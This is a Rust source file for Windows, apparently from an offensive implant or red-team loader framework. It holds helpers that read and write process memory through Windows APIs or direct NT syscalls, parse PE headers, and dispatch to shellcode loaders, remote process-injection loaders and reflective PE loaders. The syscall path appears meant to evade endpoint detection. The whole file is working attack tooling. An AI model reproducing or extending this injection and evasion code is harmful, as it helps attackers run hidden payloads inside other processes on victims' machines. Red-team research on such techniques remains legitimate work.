#![cfg(target_family = "windows")]

use std::error::Error;
use std::ffi::c_void;
use std::fs::File;
use std::io::Read;

use winapi::shared::ntdef::NULL;
use windows_sys::Win32::System::{
    Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
    Threading::GetCurrentProcess,
};

use syscalls::syscall;

use crate::loader::{reflective_loader, remote_loader, shellcode_loader};
use crate::loader_syscalls::{
    reflective_loader_syscalls, remote_loader_syscalls, shellcode_loader_syscalls,
};

pub fn fill_structure_from_array<T, U>(base: &mut T, arr: &[U], syscalls_value: bool) -> usize {
    unsafe {
        let mut ret_byte = 0;
        if syscalls_value {
            syscall!(
                "NtWriteVirtualMemory",
                GetCurrentProcess(),
                base as *mut T as *mut c_void,
                arr as *const _ as *mut c_void,
                std::mem::size_of::<T>(),
                &mut ret_byte
            );
        } else {
            WriteProcessMemory(
                GetCurrentProcess(),
                base as *mut T as *mut c_void,
                arr as *const _ as *const c_void,
                std::mem::size_of::<T>(),
                &mut ret_byte,
            );
        }
        return ret_byte;
    }
}

pub fn fill_structure_from_memory<T>(
    struct_to_fill: &mut T,
    base: *const c_void,
    prochandle: isize,
    syscalls_value: bool,
) {
    unsafe {
        let mut buf: Vec<u8> = vec![0; std::mem::size_of::<T>()];
        if syscalls_value {
            syscall!(
                "NtReadVirtualMemory",
                prochandle,
                base as *mut c_void,
                buf.as_mut_ptr() as *mut c_void,
                std::mem::size_of::<T>(),
                NULL
            );
        } else {
            ReadProcessMemory(
                prochandle,
                base,
                buf.as_mut_ptr() as *mut c_void,
                std::mem::size_of::<T>(),
                std::ptr::null_mut(),
            );
        }
        fill_structure_from_array(struct_to_fill, &buf, syscalls_value);
    }
}

pub fn read_from_memory(base: *const c_void, prochandle: isize, syscalls_value: bool) -> String {
    let mut buf: Vec<u8> = vec![0; 100];
    unsafe {
        if syscalls_value {
            syscall!(
                "NtReadVirtualMemory",
                prochandle,
                base as *mut c_void,
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
                NULL
            );
        } else {
            ReadProcessMemory(
                prochandle,
                base,
                buf.as_mut_ptr() as *mut c_void,
                100,
                std::ptr::null_mut(),
            );
        }
    }
    let mut i = 0;
    let mut tmp: Vec<u8> = vec![0; 100];
    while buf[i] != 0 {
        tmp[i] = buf[i];
        i += 1;
    }

    log::debug!("{}", String::from_utf8_lossy(&tmp).to_string());
    return String::from_utf8_lossy(&tmp).to_string();
}

pub fn get_size(buffer: &Vec<u8>, struct_to_check: &str) -> usize {
    if buffer.len() < 2 {
        log::debug!("file size is less than 2");
        return 0;
    }
    let magic = &buffer[0..2];
    let magicstring = String::from_utf8_lossy(magic);
    if magicstring == "MZ" {
        if buffer.len() < 64 {
            log::debug!("file size is less than 64");
            return 0;
        }
        let ntoffset = &buffer[60..64];
        unsafe {
            let offset = std::ptr::read(ntoffset.as_ptr() as *const i32) as usize;

            let bitversion = &buffer[offset + 4 + 20..offset + 4 + 20 + 2];
            let bit = std::ptr::read(bitversion.as_ptr() as *const u16);
            let index: usize;
            if bit == 523 {
                if struct_to_check == "header" {
                    index = offset + 24 + 60;
                    let headerssize = &buffer[index as usize..index as usize + 4];
                    let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                    log::debug!("size of headers: {:x?}", size);
                    return size as usize;
                } else {
                    index = offset + 24 + 60 - 4;
                    let headerssize = &buffer[index as usize..index as usize + 4];
                    let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                    log::debug!("size of image: {:x?}", size);
                    return size as usize;
                }
            } else if bit == 267 {
                if struct_to_check == "header" {
                    index = offset + 24 + 60;
                    let headerssize = &buffer[index as usize..index as usize + 4];
                    let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                    //println!("size of headers: {:x?}", size);
                    return size as usize;
                } else {
                    index = offset + 24 + 60 - 4;
                    let headerssize = &buffer[index as usize..index as usize + 4];
                    let size = std::ptr::read(headerssize.as_ptr() as *const i32);
                    log::debug!("size of image: {:x?}", size);
                    return size as usize;
                }
            } else {
                log::debug!("invalid bit version");
                return 0;
            }
        }
    } else {
        log::debug!("its not a pe file");
        return 0;
    }
}

pub fn string_from_array(array: &mut Vec<u8>) -> String {
    let mut res = String::new();

    for i in 0..array.len() {
        if array[i] == 0 {
            return res;
        }
        res.push(array[i] as char);
    }

    return res;
}

pub fn call_loader_shellcode(
    shellcode_to_load: Vec<u8>,
    pe_to_exec: &str,
    loader: u8,
) -> Result<(), Box<dyn Error>> {
    match loader {
        0 => match shellcode_loader_syscalls(shellcode_to_load, pe_to_exec) {
            Ok(rl) => rl,
            Err(_) => {
                return Err("Shellcode loading error".into());
            }
        },
        1 => match shellcode_loader(shellcode_to_load, pe_to_exec) {
            Ok(rl) => rl,
            Err(_) => {
                return Err("Shellcode loading error".into());
            }
        },
        _ => log::debug!("Invalid loader ID"),
    }
    Ok(())
}

pub fn call_loader_pe(
    file_to_load: &str,
    pe_to_exec: &str,
    loader: u8,
) -> Result<(), Box<dyn Error>> {
    let mut buf: Vec<u8> = Vec::new();
    let file = File::open(file_to_load.trim().replace("\\\\", "\\"));
    match file {
        Ok(mut f) => {
            f.read_to_end(&mut buf)?;
            match loader {
                0 => match remote_loader(buf, pe_to_exec) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                1 => match remote_loader_syscalls(buf, pe_to_exec) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                2 => match reflective_loader(buf) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                3 => match reflective_loader_syscalls(buf) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                _ => log::debug!("Invalid loader ID"),
            }
        }
        Err(_) => {
            return Err("Error openning file to load".into());
        }
    };

    Ok(())
}
